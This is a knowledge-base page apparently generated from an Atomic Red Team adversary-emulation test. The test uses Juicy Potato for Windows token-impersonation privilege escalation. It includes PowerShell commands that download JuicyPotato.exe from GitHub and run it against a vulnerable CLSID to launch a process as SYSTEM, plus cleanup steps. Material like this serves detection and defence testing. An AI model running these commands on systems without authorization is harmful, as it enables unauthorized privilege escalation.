---
atomic_guid: "f095e373-b936-4eb4-8d22-f47ccbfbe64a"
title: "Juicy Potato"
framework: "atomic"
generated: "true"
attack_technique_id: "T1134.001"
attack_technique_name: "Access Token Manipulation: Token Impersonation/Theft"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.001/T1134.001.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "f095e373-b936-4eb4-8d22-f47ccbfbe64a"
  - "Juicy Potato"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

This Atomic utilizes Juicy Potato to obtain privilege escalation. 
Upon successful execution of this test, a vulnerable CLSID will be used to execute a process with system permissions.
This tactic has been previously observed in SnapMC Ransomware, amongst numerous other campaigns. 
[Reference](https://blog.fox-it.com/2021/10/11/snapmc-skips-ransomware-steals-data/)

## ATT&CK Mapping

- [[kb/attack/techniques/T1134-access_token_manipulation#^t1134001-token-impersonation-theft|T1134.001: Token Impersonation/Theft]]

## Input Arguments

### listening_port

- description: COM server listen port
- type: integer
- default: 7777

### potato_path

- description: Path to the JuicyPotato.exe file
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\JuicyPotato.exe

### target_CLSID

- description: Vulnerable CLSID to impersonate privileges
- type: string
- default: {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}

### target_exe

- description: Target executable to launch with system privileges
- type: path
- default: $env:windir\system32\notepad.exe

## Dependencies

JuicyPotato.exe must exist on disk

### Prerequisite Check

```powershell
if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\JuicyPotato.exe") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\JuicyPotato.exe" "https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe"
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
cmd /c '#{potato_path}' -l '#{listening_port}' -t * -p '#{target_exe}' -c '#{target_CLSID}'
```

### Cleanup

```powershell
get-ciminstance Win32_Process | where-object { $_.Path -eq "#{target_exe}" } | invoke-cimmethod -methodname "terminate" | out-null
get-ciminstance Win32_Process | where-object { $_.Path -eq "#{potato_path}" } | invoke-cimmethod -methodname "terminate" | out-null
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.001/T1134.001.yaml)
